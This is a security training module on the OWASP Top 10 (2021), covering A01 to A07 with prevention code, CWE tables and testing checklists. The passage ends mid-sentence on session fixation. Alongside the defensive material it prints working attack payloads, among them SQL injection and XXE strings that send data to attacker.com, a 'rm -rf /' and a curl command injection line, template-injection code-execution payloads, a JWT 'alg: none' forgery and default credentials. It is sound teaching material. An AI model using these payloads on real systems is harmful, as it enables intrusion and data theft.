# OWASP Top 10 (2021) Complete Guide

> **Module 04.14** · **Last updated:** 2026-05-07

## Guiding Ideas

1. **The OWASP Top 10 is a consensus document, not a vulnerability scanner output.** Each category aggregates dozens of CWEs weighted by incidence, exploitability, and impact.
2. **Shift from reactive patching to proactive design.** A04 (Insecure Design) was added in 2021 specifically because secure coding alone cannot compensate for a flawed architecture.
3. **Every category maps to concrete CWEs.** Use the CWE mapping for SAST/DAST rule configuration and compliance traceability.
4. **Testing is not optional.** Each section concludes with a testing checklist suitable for pentest engagements and internal red-team exercises.

---

## A01:2021 — Broken Access Control

Broken Access Control moved from #5 (2017) to #1 (2021). It covers 34 CWEs and was found in 94% of applications tested. The category is broad because access control is a cross-cutting concern that touches every layer of the stack.

### Access Control Models

Understanding the model your application uses (or should use) is the prerequisite for testing it:

| Model | Description | Typical Use |
|-------|-------------|-------------|
| **DAC** (Discretionary) | Owner of a resource grants permissions to others. | File systems (Unix chmod), document sharing. |
| **MAC** (Mandatory) | System-enforced labels; users cannot override. | Military/government (SELinux, AppArmor). |
| **RBAC** (Role-Based) | Permissions assigned to roles; users assigned to roles. | Enterprise apps, SaaS (admin/editor/viewer). |
| **ABAC** (Attribute-Based) | Policies evaluate attributes of subject, resource, action, and environment. | Cloud IAM (AWS IAM policies), fine-grained APIs. |
| **ReBAC** (Relationship-Based) | Authorization derived from the graph of relationships between entities. | Social networks, Google Zanzibar, OpenFGA. |

RBAC is the most common in web applications, but modern systems increasingly adopt ABAC or ReBAC for fine-grained control. The model choice dictates where and how you test.

### Insecure Direct Object Reference (IDOR)

IDOR occurs when user-controlled input references an internal object (database row, file, API resource) without authorization checks.

**Enumeration attack:**

```http
GET /api/invoices/10042 HTTP/1.1
Authorization: Bearer eyJhbGciOi...
```

Change `10042` to `10043`. If the server returns another user's invoice, IDOR is confirmed.

**UUID prediction:** UUIDs v1 embed a timestamp and MAC address. An attacker who captures one UUID can predict adjacent ones:

```python
import uuid

# UUIDv1 — predictable
leaked = uuid.UUID("6ba7b810-9dad-11d1-80b4-00c04fd430c8")
# Extract timestamp, increment by 1 tick (100ns)
ts = leaked.time + 1
predicted = uuid.UUID(fields=(
    ts & 0xFFFFFFFF,
    (ts >> 32) & 0xFFFF,
    (ts >> 48) & 0x0FFF | 0x1000,
    leaked.clock_seq_hi_variant,
    leaked.clock_seq_low,
    leaked.node
))
print(f"Predicted: {predicted}")
```

**Mitigation:** Use UUIDv4 (random) or UUIDv7 (time-sorted but with random bits) plus server-side ownership checks. Never rely on identifier obscurity as authorization.

**Hash reversal:** Some apps replace sequential IDs with `MD5(id)`. Attackers precompute hashes for integers 1..N:

```python
import hashlib

# Precompute lookup table for IDs 1-100000
lookup = {}
for i in range(1, 100001):
    h = hashlib.md5(str(i).encode()).hexdigest()
    lookup[h] = i
# Given a hash from the URL, reverse it instantly
```

### Path Traversal

Directory traversal exploits insufficient validation of file paths.

**Basic traversal:**

```
GET /download?file=../../../../etc/passwd
```

**Null byte injection (legacy):** On older runtimes (PHP < 5.3.4, early Java):

```
GET /download?file=../../../../etc/passwd%00.png
```

The `%00` terminates the string before `.png` is appended.

**Encoding bypass:** Double-encoding bypasses single-decode filters:

```
%252e%252e%252f  →  decodes to  %2e%2e%2f  →  decodes to  ../
```

**Prevention in Go:**

```go
func safeServFile(basePath, userInput string) (string, error) {
    cleaned := filepath.Clean(userInput)
    // Reject any component that walks above base
    if strings.Contains(cleaned, "..") {
        return "", fmt.Errorf("path traversal attempt: %s", userInput)
    }
    full := filepath.Join(basePath, cleaned)
    // Verify the resolved path is still under basePath
    if !strings.HasPrefix(full, filepath.Clean(basePath)+string(os.PathSeparator)) {
        return "", fmt.Errorf("path escape: %s", full)
    }
    return full, nil
}
```

### CORS Misconfiguration

A wildcard `Access-Control-Allow-Origin: *` combined with `Access-Control-Allow-Credentials: true` is the classic misconfiguration. Browsers block this combination, but many servers reflect the `Origin` header verbatim:

```python
# VULNERABLE: reflects any origin
@app.after_request
def add_cors(response):
    origin = request.headers.get("Origin", "")
    response.headers["Access-Control-Allow-Origin"] = origin
    response.headers["Access-Control-Allow-Credentials"] = "true"
    return response
```

**Exploitation:** An attacker hosts a page that issues a credentialed fetch to the vulnerable API. The browser attaches the victim's cookies, and the response is readable by the attacker's script because the origin is reflected.

**Fix:** Maintain an explicit allowlist:

```python
ALLOWED_ORIGINS = {"https://app.example.com", "https://staging.example.com"}

@app.after_request
def add_cors(response):
    origin = request.headers.get("Origin", "")
    if origin in ALLOWED_ORIGINS:
        response.headers["Access-Control-Allow-Origin"] = origin
        response.headers["Access-Control-Allow-Credentials"] = "true"
    return response
```

### Forced Browsing

Accessing resources that are not linked from the UI but exist on the server: `/admin`, `/backup.sql`, `/swagger-ui.html`, `/.env`. Automated scanners like `ffuf`, `gobuster`, or `feroxbuster` enumerate these paths using wordlists.

### Privilege Escalation

**Horizontal:** User A accesses User B's resources (same privilege level). Example: changing `user_id` in a request body.

**Vertical:** A regular user accesses admin functionality. Example: sending `{"role": "admin"}` in a profile update request when the server blindly persists the role field.

**Detection script (Burp extension pseudocode):**

```python
# Swap session tokens between low-priv and high-priv user
# Replay every high-priv request with low-priv token
# Flag any response that returns 200 instead of 403
for req in high_priv_requests:
    modified = req.replace_header("Authorization", low_priv_token)
    resp = send(modified)
    if resp.status_code != 403:
        report_finding("Vertical privilege escalation", req.url)
```

### Metadata Manipulation

**JWT claims tampering:** Modify the `sub`, `role`, or `tenant_id` claim in a JWT. If the server does not validate the signature (or uses `alg: none`), the claim is trusted:

```python
import jwt

# Attacker forges a token with admin role
forged = jwt.encode(
    {"sub": "attacker", "role": "admin"},
    key="",           # Empty key
    algorithm="none"  # No signature
)
```

**Hidden form fields:** Legacy apps store price or user ID in hidden `<input>` elements. Intercepting the POST and changing the value bypasses client-side controls.

**Cookie manipulation:** Session cookies that embed role or permission data (e.g., `role=user`) can be changed in the browser's dev tools or via an intercepting proxy.

### IDOR in APIs

REST and GraphQL APIs are highly susceptible:

```graphql
# GraphQL IDOR — query another user's data
query {
  user(id: "other-user-uuid") {
    email
    ssn
    creditCards { last4 }
  }
}
```

Prevention requires authorization middleware that checks the authenticated user's ownership of the requested resource at the resolver level.

### CWE Mapping

| CWE | Name |
|-----|------|
| CWE-200 | Exposure of Sensitive Information |
| CWE-201 | Insertion of Sensitive Information Into Sent Data |
| CWE-352 | Cross-Site Request Forgery |
| CWE-639 | Authorization Bypass Through User-Controlled Key |

### Testing Checklist — A01

- [ ] Attempt horizontal access: change resource IDs with same-privilege token.
- [ ] Attempt vertical access: replay admin requests with user-level token.
- [ ] Test path traversal on all file-serving endpoints.
- [ ] Verify CORS policy does not reflect arbitrary origins.
- [ ] Fuzz hidden endpoints with directory/API wordlists.
- [ ] Tamper with JWT claims (`sub`, `role`, `tenant_id`, `iss`).
- [ ] Check for `alg: none` and HMAC/RSA key confusion in JWT.
- [ ] Verify POST/PUT/DELETE methods enforce ownership checks, not just GET.

---

## A02:2021 — Cryptographic Failures

Formerly "Sensitive Data Exposure," renamed to focus on the root cause: failures in cryptographic controls.

### Data Classification

Before choosing crypto controls, classify data:

| Tier | Examples | Minimum Controls |
|------|----------|-----------------|
| **Public** | Marketing content, open docs | Integrity (checksums) |
| **Internal** | Internal emails, non-sensitive configs | TLS in transit, access control |
| **Confidential** | PII, financial records, medical data | TLS 1.2+, AES-256 at rest, key management |
| **Restricted** | Credentials, cryptographic keys, PCI data | HSM/KMS, envelope encryption, strict audit |

Regulatory frameworks (GDPR, HIPAA, PCI-DSS) impose classification requirements. Failing to classify means failing to protect.

### Data in Transit

**TLS misconfiguration patterns:**

1. **Protocol downgrade:** Allowing TLS 1.0/1.1. Both are deprecated (RFC 8996).
2. **Weak cipher suites:** `RC4`, `DES`, `3DES`, `NULL` ciphers, `EXPORT` grades.
3. **Missing HSTS:** Without `Strict-Transport-Security`, the first request can be intercepted (SSL stripping via tools like `sslstrip`).
4. **Certificate issues:** Self-signed in production, expired certs, wildcard certs on sensitive subdomains, missing certificate pinning on mobile.

**Testing with `testssl.sh`:**

```bash
# Comprehensive TLS scan
./testssl.sh --severity HIGH --sneaky https://target.example.com
```

**Testing with `nmap`:**

```bash
nmap --script ssl-enum-ciphers -p 443 target.example.com
```

### Data at Rest

**Weak hashing:** Using MD5 or SHA-1 for password storage. Both are fast algorithms designed for integrity, not password resistance.

**Reversible encryption for passwords:** Encrypting (rather than hashing) passwords means the key holder can recover all passwords. A database breach plus key compromise yields all credentials.

**Missing encryption:** Storing credit card numbers, SSNs, or health records in plaintext database columns.

### Key Management Failures

**Hardcoded keys (CWE-798):**

```java
// VULNERABLE — key committed to source control
private static final String AES_KEY = "0123456789abcdef0123456789abcdef";
```

**Weak generation:**

```python
import random
# VULNERABLE — random module is not cryptographically secure
key = bytes([random.randint(0, 255) for _ in range(32)])

# CORRECT
import secrets
key = secrets.token_bytes(32)
```

**Missing rotation:** Keys used indefinitely accumulate risk. Define rotation schedules: 90 days for symmetric keys, 1-2 years for asymmetric, immediate rotation on suspected compromise.

### Crypto Library Misuse

**ECB mode (CWE-327):** Each block encrypted independently, revealing patterns:

```python
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

# WRONG — ECB leaks patterns (the "ECB penguin" problem)
cipher = Cipher(algorithms.AES(key), modes.ECB())

# CORRECT — GCM provides authenticated encryption
cipher = Cipher(algorithms.AES(key), modes.GCM(iv))
```

**Static IV:** Reusing the same initialization vector with the same key across messages allows ciphertext comparison attacks:

```python
# WRONG — IV reuse
iv = b'\x00' * 12

# CORRECT — unique IV per encryption
import os
iv = os.urandom(12)
```

### Password Storage

| Algorithm | Type | Memory-Hard | GPU Resistant | Recommended Config |
|-----------|------|-------------|---------------|-------------------|
| **bcrypt** | Blowfish-based KDF | No | Moderate | cost=12+ |
| **scrypt** | Sequential memory-hard | Yes | Good | N=2^15, r=8, p=1 |
| **Argon2id** | Winner of PHC | Yes | Best | m=64MB, t=3, p=4 |

Argon2id is the recommended choice for new systems (RFC 9106). It resists both GPU and side-channel attacks.

**Argon2id in Node.js:**

```javascript
const argon2 = require('argon2');

async function hashPassword(password) {
  return argon2.hash(password, {
    type: argon2.argon2id,
    memoryCost: 65536,  // 64 MB
    timeCost: 3,
    parallelism: 4,
  });
}

async function verifyPassword(hash, password) {
  return argon2.verify(hash, password);
}
```

### Testing Checklist — A02

- [ ] Verify TLS 1.2+ enforced; no fallback to TLS 1.0/1.1.
- [ ] Confirm no weak ciphers in server configuration.
- [ ] Check HSTS header with `max-age >= 31536000`.
- [ ] Verify passwords stored with bcrypt/scrypt/Argon2id (not MD5/SHA).
- [ ] Confirm no hardcoded keys/secrets in source (use `trufflehog`, `gitleaks`).
- [ ] Verify cryptographic randomness uses `secrets`/`crypto.randomBytes`/`SecureRandom`.
- [ ] Check AES is used in GCM/CCM mode, never ECB.
- [ ] Validate IVs/nonces are unique per operation.
- [ ] Confirm key rotation schedule exists and is followed.

---

## A03:2021 — Injection

Injection drops from #1 (2017) to #3 (2021), but remains one of the most impactful categories. It now includes XSS, which was previously a separate category.

### SQL Injection — All Variants

**Classic (in-band):**

```sql
-- Input: ' OR 1=1 --
SELECT * FROM users WHERE username = '' OR 1=1 --' AND password = '...'
```

**Union-based:** Extract data from other tables by appending `UNION SELECT`:

```sql
-- Determine column count first
' ORDER BY 1-- (increment until error)
-- Extract data
' UNION SELECT username, password, null FROM admin_users--
```

**Blind (Boolean-based):**

```sql
-- True condition: normal page renders
' AND 1=1--
-- False condition: different response
' AND 1=2--
-- Extract data one bit at a time
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE id=1)='a'--
```

**Blind (Time-based):**

```sql
-- If true, wait 5 seconds
' AND IF(1=1, SLEEP(5), 0)--
-- Extract data
' AND IF((SELECT SUBSTRING(password,1,1) FROM users WHERE id=1)='a', SLEEP(5), 0)--
```

**Second-order:** The payload is stored in the database and triggered later by a different query (e.g., stored in a username field, triggered during an admin report generation).

**Out-of-band (OOB):** Exfiltrate data via DNS or HTTP requests from the database server:

```sql
-- MySQL
' UNION SELECT LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users LIMIT 1), '.attacker.com\\share'))--
-- MSSQL
'; EXEC xp_dirtree '\\' + (SELECT TOP 1 password FROM users) + '.attacker.com\share'--
```

### NoSQL Injection

**MongoDB (operator injection):**

```javascript
// VULNERABLE — user input becomes a query operator
db.users.find({ username: req.body.username, password: req.body.password });

// Malicious input: { "password": { "$ne": "" } }
// Matches any user whose password is not empty — bypasses auth
```

**Prevention:**

```javascript
// Validate types explicitly
const username = String(req.body.username);
const password = String(req.body.password);
db.users.find({ username, password });
```

**Redis injection:** If user input is interpolated into `EVAL` scripts:

```
EVAL "return redis.call('GET', KEYS[1])" 1 user_input
-- If user_input = "key') redis.call('FLUSHALL') --"
```

### OS Command Injection

**Direct injection:**

```python
import subprocess

# VULNERABLE
filename = request.args.get("file")
subprocess.call(f"convert {filename} output.pdf", shell=True)

# Input: "; rm -rf / #"
# Executed: convert ; rm -rf / # output.pdf
```

**Blind injection (time-based):**

```
; sleep 10 #
```

If the response takes 10 seconds longer, command injection is confirmed.

**Out-of-band:**

```
; curl https://attacker.com/$(whoami) #
```

**Prevention:**

```python
import subprocess
import shlex

# SAFE — no shell, arguments as list
filename = request.args.get("file")
# Validate against allowlist
if not re.match(r'^[a-zA-Z0-9_\-\.]+$', filename):
    abort(400)
subprocess.run(["convert", filename, "output.pdf"], check=True)
```

### LDAP Injection

```
# VULNERABLE query
(&(uid={user_input})(userPassword={password_input}))

# Injection: user_input = "*)(uid=*))(|(uid=*"
# Result: (&(uid=*)(uid=*))(|(uid=*)(userPassword=...))
# Bypasses authentication
```

### XPath Injection

```xml
<!-- Vulnerable query -->
//users/user[username/text()='{input}' and password/text()='{pwd}']

<!-- Injection: input = "' or '1'='1" -->
//users/user[username/text()='' or '1'='1' and password/text()='anything']
```

### Expression Language (EL) Injection

In Java EE / Spring:

```
# Input via parameter: ${7*7}
# If the page renders "49", EL injection confirmed

# Escalation:
${Runtime.getRuntime().exec("id")}
```

### ORM Injection

Even ORMs can be vulnerable when using raw queries or interpolation:

```python
# Django — VULNERABLE
User.objects.raw(f"SELECT * FROM auth_user WHERE username = '{username}'")

# Django — SAFE
User.objects.raw("SELECT * FROM auth_user WHERE username = %s", [username])
```

### Server-Side Template Injection (SSTI)

Template engines (Jinja2, Twig, Freemarker, Velocity) that render user input as template code:

```python
# Jinja2 — VULNERABLE
from jinja2 import Template
template = Template(f"Hello {user_input}")

# Probe: {{ 7*7 }} → renders "Hello 49"
# RCE payload (Jinja2/Python):
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
```

**Detection methodology:**

```
Input: ${7*7}  → 49?  (EL/Freemarker)
Input: {{7*7}} → 49?  (Jinja2/Twig)
Input: #{7*7}  → 49?  (Ruby ERB/Slim)
Input: {7*7}   → 49?  (Smarty)
```

### Header Injection

**CRLF injection:** Injecting `\r\n` into HTTP headers to add arbitrary headers or split the response:

```
# Input in a redirect URL:
/redirect?url=http://example.com%0d%0aSet-Cookie:%20admin=true

# Server generates:
HTTP/1.1 302 Found
Location: http://example.com
Set-Cookie: admin=true
```

**Host header injection:** Used for cache poisoning and password reset poisoning:

```http
POST /reset-password HTTP/1.1
Host: attacker.com
...

# If the server uses the Host header to build the reset link:
# https://attacker.com/reset?token=secret-token
```

### Prevention Architecture

```
┌─────────────────────────────────────────────────┐
│              Input Validation Layer              │
│  Schema validation, type coercion, allowlists    │
├─────────────────────────────────────────────────┤
│           Parameterized Query Layer              │
│  Prepared statements, ORM safe methods           │
├─────────────────────────────────────────────────┤
│           Output Encoding Layer                  │
│  Context-aware: HTML/JS/URL/CSS encoding         │
├─────────────────────────────────────────────────┤
│              WAF / Runtime Layer                 │
│  ModSecurity, AWS WAF, Cloudflare (defense in    │
│  depth — never the only control)                 │
└─────────────────────────────────────────────────┘
```

### Testing Checklist — A03

- [ ] Test all user inputs for SQL injection (manual + `sqlmap`).
- [ ] Test NoSQL endpoints with operator injection payloads.
- [ ] Probe template rendering endpoints with `{{7*7}}` / `${7*7}`.
- [ ] Test file-handling endpoints for OS command injection.
- [ ] Verify all queries use parameterized statements.
- [ ] Check for CRLF injection in redirect and header-setting endpoints.
- [ ] Confirm output encoding is context-aware (HTML vs JS vs URL).

---

## A04:2021 — Insecure Design

New in 2021. Insecure Design addresses flaws that cannot be fixed by perfect implementation — the architecture itself is broken.

### Threat Modeling

**STRIDE** (Microsoft, per-element analysis):

| Threat | Property Violated | Example |
|--------|-------------------|---------|
| **S**poofing | Authentication | Forged JWT, stolen session |
| **T**ampering | Integrity | Modified request body, DB record alteration |
| **R**epudiation | Non-repudiation | Missing audit logs |
| **I**nformation Disclosure | Confidentiality | Verbose error messages, IDOR |
| **D**enial of Service | Availability | Resource exhaustion, algorithmic complexity |
| **E**levation of Privilege | Authorization | Admin function accessed by regular user |

**PASTA** (Process for Attack Simulation and Threat Analysis) — a risk-centric, 7-stage methodology:

1. Define business objectives.
2. Define technical scope.
3. Decompose the application.
4. Analyze threats (threat intelligence).
5. Identify vulnerabilities.
6. Enumerate and model attacks.
7. Risk and impact analysis.

**Attack Trees:** Decompose a goal (e.g., "steal user credentials") into a tree of sub-goals with AND/OR nodes. Each leaf node represents a concrete attack technique.

```
[Steal Credentials]
├── [Phishing] (AND)
│   ├── Craft convincing email
│   └── Host credential harvester
├── [SQLi on Login] (OR)
│   └── Extract users table
├── [Credential Stuffing] (OR)
│   ├── Obtain breach database
│   └── Automate login attempts
└── [Session Hijacking] (OR)
    ├── XSS to steal cookie
    └── Network sniffing (no TLS)
```

### Secure Design Patterns

**Mediator pattern (for authorization):** Centralize access decisions in a single component rather than scattering checks across handlers:

```java
public class AuthorizationMediator {
    private final PolicyEngine policyEngine;

    public boolean authorize(Subject subject, Resource resource, Action action) {
        Decision decision = policyEngine.evaluate(subject, resource, action);
        auditLog.record(subject, resource, action, decision);
        return decision == Decision.PERMIT;
    }
}
```

**Strategy pattern (for input validation):** Different validation strategies per context:

```python
class InputValidator:
    def __init__(self, strategy: ValidationStrategy):
        self._strategy = strategy

    def validate(self, data: str) -> bool:
        return self._strategy.validate(data)

class EmailValidation(ValidationStrategy):
    def validate(self, data: str) -> bool:
        return bool(re.match(r'^[^@]+@[^@]+\.[^@]+$', data))

class SQLSafeValidation(ValidationStrategy):
    def validate(self, data: str) -> bool:
        # Reject known SQL meta-characters as defense-in-depth
        return not re.search(r"['\";\\--]", data)
```

**Factory pattern (for crypto):** Prevent developers from choosing insecure defaults:

```go
// CryptoFactory enforces organizational standards
func NewEncryptor(purpose string) (Encryptor, error) {
    switch purpose {
    case "data-at-rest":
        return NewAESGCMEncryptor(256) // AES-256-GCM enforced
    case "password":
        return NewArgon2idHasher(64*1024, 3, 4) // org-standard config
    default:
        return nil, fmt.Errorf("unknown crypto purpose: %s", purpose)
    }
}
```

### Abuse Cases and Misuse Cases

For every user story, write a corresponding abuse case:

| User Story | Abuse Case |
|------------|------------|
| "User can reset password via email" | "Attacker resets victim's password by manipulating Host header to redirect reset link" |
| "User can upload profile picture" | "Attacker uploads web shell disguised as image" |
| "User can search products" | "Attacker performs ReDoS via crafted regex input" |
| "User can export report as PDF" | "Attacker triggers SSRF via HTML-to-PDF renderer" |

### Security Requirements Engineering

Derive security requirements from threat models:

```
REQ-SEC-001: All API endpoints MUST enforce authentication via signed JWT.
REQ-SEC-002: Password reset tokens MUST expire within 15 minutes.
REQ-SEC-003: File uploads MUST be validated by content type (magic bytes),
             not file extension.
REQ-SEC-004: Rate limiting MUST be applied: 10 login attempts per minute
             per IP/account pair.
REQ-SEC-005: All financial transactions MUST be logged with timestamp,
             actor, action, and before/after state.
```

### Business Logic Vulnerabilities

These cannot be found by scanners — only by understanding the domain:

- **Race conditions:** Two concurrent requests that each check balance before deducting it (TOCTOU).
- **Workflow bypass:** Skipping from step 1 to step 5 in a multi-step checkout.
- **Numeric overflow:** Integer overflow in quantity field leading to negative price.
- **Coupon stacking:** Applying the same discount code multiple times.

### Testing Checklist — A04

- [ ] Verify threat model exists and is current.
- [ ] Confirm abuse cases documented for critical user stories.
- [ ] Test multi-step workflows for step-skipping.
- [ ] Test for race conditions on balance/inventory operations.
- [ ] Verify rate limiting on authentication and financial endpoints.
- [ ] Confirm file upload validates content, not just extension.

---

## A05:2021 — Security Misconfiguration

Covers 20 CWEs. Found in 90% of applications. Includes the former A04:2017 XML External Entities (XXE).

### Default Credentials

Common default credentials that persist in production:

```
admin:admin          (Tomcat Manager, phpMyAdmin)
admin:password       (routers, IoT devices)
sa:                  (SQL Server with blank password)
root:root            (MySQL)
guest:guest          (RabbitMQ)
elastic:changeme     (Elasticsearch)
```

Tools: `changeme`, `DefaultCreds-Cheat-Sheet`, Nmap `http-default-accounts` script.

### Unnecessary Features

**Debug modes in production:**

```python
# Django — NEVER in production
DEBUG = True  # Exposes full stack traces, settings, SQL queries

# Flask
app.run(debug=True)  # Enables Werkzeug debugger — interactive Python console
```

**Sample applications:** Tomcat ships with `/examples`, `/docs`, and `/manager` which provide attack surface. Spring Boot Actuator exposes `/actuator/env`, `/actuator/heapdump` if not secured.

### Stack Trace Exposure

Verbose errors reveal framework versions, file paths, database schemas, and connection strings.

**Java — secure error handling:**

```java
@ControllerAdvice
public class GlobalExceptionHandler {
    private static final Logger log = LoggerFactory.getLogger(GlobalExceptionHandler.class);

    @ExceptionHandler(Exception.class)
    public ResponseEntity<ErrorResponse> handleException(Exception ex) {
        String errorId = UUID.randomUUID().toString();
        log.error("Error {}: {}", errorId, ex.getMessage(), ex);
        return ResponseEntity
            .status(500)
            .body(new ErrorResponse(errorId, "An internal error occurred."));
    }
}
```

### Cloud Misconfiguration

**S3 bucket exposure:**

```bash
# Check for public access
aws s3 ls s3://target-bucket --no-sign-request

# Enumerate with bucket finder
python3 cloud_enum.py -k target-company
```

**Azure Blob public access:**

```bash
# Check if container allows anonymous access
curl -s "https://account.blob.core.windows.net/container?restype=container&comp=list"
```

**GCS misconfiguration:**

```bash
# Check public access
curl "https://storage.googleapis.com/bucket-name"
```

**Prevention:** Enable "Block All Public Access" at the account level (S3), disable anonymous access (Azure/GCS), use IAM policies with least privilege.

### XML External Entities (XXE)

Now part of A05 (was standalone A04 in 2017). XXE exploits XML parsers that process external entity declarations:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user><name>&xxe;</name></user>
```

**Blind XXE via OOB:**

```xml
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<!-- evil.dtd on attacker server:
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
%exfil;
-->
```

**Prevention across languages:**

```python
# Python (lxml)
from lxml import etree
parser = etree.XMLParser(resolve_entities=False, no_network=True)

# Java
factory = DocumentBuilderFactory.newInstance()
factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", True)

# .NET
var settings = new XmlReaderSettings();
settings.DtdProcessing = DtdProcessing.Prohibit;
```

### Security Headers

| Header | Value | Purpose |
|--------|-------|---------|
| `Content-Security-Policy` | `default-src 'self'; script-src 'nonce-{random}'` | XSS mitigation |
| `Strict-Transport-Security` | `max-age=31536000; includeSubDomains; preload` | Force HTTPS |
| `X-Content-Type-Options` | `nosniff` | Prevent MIME sniffing |
| `X-Frame-Options` | `DENY` | Clickjacking prevention |
| `Permissions-Policy` | `camera=(), microphone=(), geolocation=()` | Feature restriction |
| `Referrer-Policy` | `strict-origin-when-cross-origin` | Control referer leakage |
| `Cross-Origin-Opener-Policy` | `same-origin` | Isolate browsing context |
| `Cross-Origin-Resource-Policy` | `same-origin` | Prevent cross-origin reads |

**Express.js with Helmet:**

```javascript
const helmet = require('helmet');
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'"],
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", "data:", "https:"],
      connectSrc: ["'self'"],
      frameSrc: ["'none'"],
      objectSrc: ["'none'"],
    },
  },
  hsts: { maxAge: 31536000, includeSubDomains: true, preload: true },
}));
```

### Testing Checklist — A05

- [ ] Scan for default credentials on all administrative interfaces.
- [ ] Verify debug mode disabled in all environments.
- [ ] Confirm no sample/test applications deployed.
- [ ] Check all security headers present (`securityheaders.com`).
- [ ] Test for XXE on all XML-accepting endpoints.
- [ ] Verify cloud storage has no public access.
- [ ] Confirm error responses do not leak stack traces.
- [ ] Review directory listing disabled on web servers.

---

## A06:2021 — Vulnerable and Outdated Components

New standalone category (previously part of A09:2017). 30% of CVEs exploited in the wild target known vulnerabilities in components.

### SCA Tools and Processes

Software Composition Analysis (SCA) tools identify vulnerable dependencies:

| Tool | Languages | Integration |
|------|-----------|-------------|
| `npm audit` / `yarn audit` | JS/TS | CLI, CI |
| `pip-audit` | Python | CLI, CI |
| `govulncheck` | Go | CLI, CI |
| `cargo audit` | Rust | CLI, CI |
| **Snyk** | Multi-language | CLI, CI, IDE |
| **Trivy** | Containers, IaC, repos | CLI, CI |
| **Grype** | Container images, SBOM | CLI, CI |
| **OWASP Dependency-Check** | Java, .NET, JS | CLI, CI |

### CVE Databases

- **NVD** (National Vulnerability Database): Canonical US government CVE database.
- **GitHub Advisory Database**: Covers npm, pip, Maven, RubyGems, Go, Rust, Erlang, Pub.
- **OSV** (Open Source Vulnerabilities): Google-maintained, schema-standardized.
- **VulnDB**: Commercial, broader coverage including proprietary software.

### Transitive Dependency Risks

Your direct dependency on library A may pull in library B v1.2.3, which has a known CVE. The attack surface is not limited to what you explicitly `import`.

```bash
# Visualize dependency tree
npm ls --all
pip install pipdeptree && pipdeptree
go mod graph
```

### Dependency Confusion Attacks

An attacker publishes a public package with the same name as an internal/private package, but with a higher version number. Package managers that check public registries first (or in addition to private ones) install the attacker's package.

**Prevention:**

```bash
# npm — scope packages to your org
@yourcompany/internal-lib

# pip — configure index-url to private only
pip install --index-url https://private.pypi.org/simple/ package-name

# .npmrc
registry=https://npm.pkg.github.com/yourcompany
```

### Typosquatting

Attackers publish packages with names similar to popular ones:

```
lodash    →  1odash, lodas, lodashs
requests  →  request, requets
express   →  expres, expresss
```

Detection: Compare new dependency names against known packages using edit-distance algorithms. Tools like Socket.dev flag suspicious packages.

### Version Pinning vs Floating

| Strategy | Syntax (npm) | Tradeoff |
|----------|-------------|----------|
| Exact pin | `"1.2.3"` | Max reproducibility, manual update burden |
| Patch float | `"~1.2.3"` | Auto-patch updates, minor risk |
| Minor float | `"^1.2.3"` | Broader updates, higher risk |
| Latest | `"*"` | Maximum risk, no reproducibility |

**Recommendation:** Pin exact versions in lockfiles (`package-lock.json`, `poetry.lock`, `go.sum`). Use automated tools to propose updates.

### SBOM Generation

**SPDX format:**

```bash
# Generate SBOM with syft
syft dir:. -o spdx-json > sbom.spdx.json
```

**CycloneDX format:**

```bash
# Generate for Node.js project
npx @cyclonedx/cyclonedx-npm --output-file sbom.cdx.json

# Generate for Python project
pip install cyclonedx-bom
cyclonedx-py requirements -i requirements.txt -o sbom.cdx.json
```

### Automated Dependency Updates

**Dependabot (GitHub):**

```yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: "npm"
    directory: "/"
    schedule:
      interval: "weekly"
    open-pull-requests-limit: 10
    reviewers:
      - "security-team"
```

**Renovate (multi-platform):**

```json
{
  "$schema": "https://docs.renovatebot.com/renovate-schema.json",
  "extends": ["config:recommended", "security:openssf-scorecard"],
  "vulnerabilityAlerts": { "enabled": true },
  "packageRules": [
    {
      "matchUpdateTypes": ["major"],
      "labels": ["breaking-change"],
      "automerge": false
    },
    {
      "matchUpdateTypes": ["patch"],
      "automerge": true
    }
  ]
}
```

### Testing Checklist — A06

- [ ] Run SCA tool in CI pipeline (fail build on HIGH/CRITICAL CVEs).
- [ ] Verify lockfiles committed and used in CI.
- [ ] Check for dependency confusion: scope private packages.
- [ ] Generate SBOM and store with each release.
- [ ] Review transitive dependencies for known vulnerabilities.
- [ ] Confirm automated dependency update tool is active.
- [ ] Audit new dependencies for license, maintenance, and CVE history.

---

## A07:2021 — Identification and Authentication Failures

Formerly "Broken Authentication." Covers credential stuffing, session management, and MFA bypass.

### Credential Stuffing

Attackers use breached credential databases (billions of username:password pairs) and automate login attempts at scale. Tools: `Sentry MBA`, `OpenBullet`, custom scripts with `httpx`/`aiohttp`.

**Detection and prevention:**

```python
# Rate limiting with sliding window (Redis)
import redis
import time

r = redis.Redis()

def check_rate_limit(identifier: str, max_attempts: int = 10, window: int = 900) -> bool:
    """Returns True if request is allowed, False if rate-limited."""
    key = f"login_attempts:{identifier}"
    pipe = r.pipeline()
    now = time.time()
    pipe.zremrangebyscore(key, 0, now - window)
    pipe.zadd(key, {str(now): now})
    pipe.zcard(key)
    pipe.expire(key, window)
    results = pipe.execute()
    return results[2] <= max_attempts
```

### Brute Force

**Online brute force:** Directly attacking the login endpoint. Mitigated by rate limiting, account lockout (temporary), and CAPTCHA.

**Offline brute force:** Attacker has the password hash database. Speed depends on the hash algorithm:

| Algorithm | Hashes/sec (RTX 4090) | Time to crack 8-char password |
|-----------|-----------------------|-------------------------------|
| MD5 | ~160 billion | Seconds |
| SHA-256 | ~22 billion | Minutes |
| bcrypt (cost 12) | ~70,000 | Centuries |
| Argon2id (64MB, t=3) | ~500 | Heat death of universe |

**Rainbow tables:** Precomputed hash-to-plaintext lookup tables. Defeated by salting (unique random value prepended to each password before hashing).

### Session Management

**Session fixation:** Attacker sets a known session ID before the victim authenticates:

```
1. Attacker obtains session ID: SESS=abc123
